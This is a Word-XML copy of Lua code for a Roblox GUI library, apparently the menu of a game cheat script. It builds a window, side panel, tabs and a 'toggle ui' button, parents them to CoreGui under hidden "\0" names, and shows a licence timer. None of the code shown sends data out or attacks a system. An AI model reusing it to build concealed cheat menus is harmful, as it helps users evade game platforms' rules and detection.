    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if library[ "other" ] then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library[ "other" ]:Destroy()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for index, connection in library.connections do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                connection:Disconnect() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                connection = nil 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library = nil </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    -- Library element functions</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function library:window(properties)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = { </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                suffix = properties.suffix or properties.Suffix or "tech";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = properties.name or properties.Name or "nebula";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                game_name = properties.gameInfo or properties.game_info or properties.GameInfo or "Milenium for Counter-Strike: Global Offensive";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                size = properties.size or properties.Size or dim2(0, 700, 0, 565);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                selected_tab;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {};</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                tween;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library[ "items" ] = library:create( "ScreenGui" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Parent = coregui;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Enabled = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ZIndexBehavior = Enum.ZIndexBehavior.Global;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                IgnoreGuiInset = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            });</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            library[ "other" ] = library:create( "ScreenGui" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Parent = coregui;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Enabled = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ZIndexBehavior = Enum.ZIndexBehavior.Sibling;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                IgnoreGuiInset = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            }); </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local items = cfg.items; do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "main" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = library[ "items" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = cfg.size;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(0.5, -cfg.size.X.Offset / 2, 0.5, -cfg.size.Y.Offset / 2);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BackgroundColor3 = rgb(14, 14, 16)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }); items[ "main" ].Position = dim2(0, items[ "main" ].AbsolutePosition.X, 0, items[ "main" ].AbsolutePosition.Y)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:create( "UIScale" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "main" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Scale = scale;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                });</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:create( "UICorner" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "main" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    CornerRadius = dim(0, 10)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"UIStroke" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Color = rgb(23, 23, 29);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "main" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border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"side_frame" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "main" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0, 196, 1, -25);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(14, 14, 16)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"Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AnchorPoint = vec2(1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "side_frame" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(1, 0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(0, 1, 1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(21, 21, 23)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"button_holder" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "side_frame"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0, 0, 60);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, 0, 1, -60);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cfg.button_holder = items[ "button_holder" ];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"button_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Padding = dim(0, 5);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PaddingTop = dim(0, 16);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PaddingBottom = dim(0, 36);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "button_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PaddingRight = dim(0, 11);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    PaddingLeft = dim(0, 10)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                });</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local accent = themes.preset.accent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "title" ] = library:create( "TextLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Text = name;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "side_frame" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Text = string.format('&lt;u&gt;%s&lt;/u&gt;&lt;font color = "rgb(255, 255, 255)"&gt;%s&lt;/font&gt;', cfg.name, cfg.suffix);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, 0, 0, 70);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextColor3 = themes.preset.accent;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    RichText = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextSize = 30;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"title" ], "accent", "TextColor3");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "multi_holder" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "main"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196, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, -196, 0, 56);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cfg.multi_holder = items[ "multi_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">               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"multi_holder"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0, 0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(21, 21, 23)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"shadow" ] = library:create( "ImageLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ImageColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ScaleType = Enum.ScaleType.Slice;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "main" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(255, 255, 255);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, 75, 1, 75);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AnchorPoint = vec2(0.5, 0.5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Image = "rbxassetid://112971167999062";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(0.5, 0, 0.5, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    SliceScale = 0.75;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ZIndex = -100;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    SliceCenter = rect(vec2(112, 112), vec2(147, 147))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"global_fade" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "main"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196, 0, 56);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, -196, 1, -81);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(14, 14, 16);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ZIndex = 2;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                });                </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:create( "UICorner" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "shadow" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    CornerRadius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"info" ] =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"main" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";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0, 0, 25);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(23, 23, 25)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"info" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    CornerRadius = dim(0, 10)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"grey_fill" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "info" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, 0, 0, 6);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundColor3 = rgb(23, 23, 25)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"game" ] = library:create( "TextLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "info" ];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cfg.game_name;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AnchorPoint = vec2(0, 0.5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(0, 10, 0.5, -1);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 </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not LRM_SecondsLeft then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LRM_SecondsLeft = math.huge</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local time_left = tostring((LRM_SecondsLeft &lt; math.huge and ""..tostring(math.floor(((LRM_SecondsLeft / 60) / 60) / 24)).." days" or LRM_SecondsLeft == math.huge and "lifetime"))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "other_info" ] = library:create( "TextLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "info" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    RichText = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextColor3 = themes.preset.accent;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Text = '&lt;font color="rgb(72, 72, 73)"&gt;'..time_left..', &lt;/font&gt;' .. cfg.name:lower() .. cfg.suffix:lower();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, 0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(0, -10, 0.5, -1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AnchorPoint = vec2(0, 0.5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextXAlignment = Enum.TextXAlignment.Right;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AutomaticSize = Enum.AutomaticSize.XY;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    FontFace = fonts.font;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"other_info" ], "accent", "TextColor3");        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            do -- Other</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:draggify(items[ "main" ])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:resizify(items[ "main" ])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.toggle_menu(bool) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- WIP </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- if cfg.tween then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                --     cfg.tween:Cancel()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- items[ "main" ].Size = dim2(items[ "main" ].Size.Scale.X, items[ "main" ].Size.Offset.X - 20, items[ "main" ].Size.Scale.Y, items[ "main" ].Size.Offset.Y - 20)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- library:tween(items[ "tab_holder" ], {Size = dim2(1, -196, 1, -81)}, Enum.EasingStyle.Quad, 0.4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- cfg.tween = </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "main" ].Visible = bool</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "close button" ] = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Parent = library[ "items" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Position = dim2(0, 20, 1, -20);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                AnchorPoint = vec2(0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Size = dim2(0, 75, 0, 50);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Text = "";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                AutoButtonColor = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Visible = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                BackgroundColor3 = rgb(25, 25, 29)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "other_info" ] = library:create( "TextLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Parent = items[ "close button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                RichText = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                TextColor3 = rgb(245, 245, 245);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Text = "toggle ui";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Size = dim2(1, 0, 1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                TextXAlignment = Enum.TextXAlignment.Center;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ZIndex = 2;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                TextSize = 14;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                BackgroundColor3 = rgb(255, 255, 255)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            });</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            library:create( "UICorner" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Parent = items[ "close button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                CornerRadius = dim(0, 10)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            library:create( "UIStroke" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Color = rgb(23, 23, 29);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Parent = items[ "close button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ApplyStrokeMode = Enum.ApplyStrokeMode.Border</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            });</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local open = true </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            items[ "close button" ].InputBegan:Connect(function(input)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.Touch then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    open = not open </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    cfg.toggle_menu(open)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p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library:tab(properties)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = properties.name or properties.Name or "visuals"; </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                icon = properties.icon or properties.Icon or "http://www.roblox.com/asset/?id=6034767608";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- multi </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                tabs = properties.tabs or properties.Tabs or {"Main", "Misc.", "Settings"};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                pages = {}; -- data store for multi sections</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                current_multi; </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
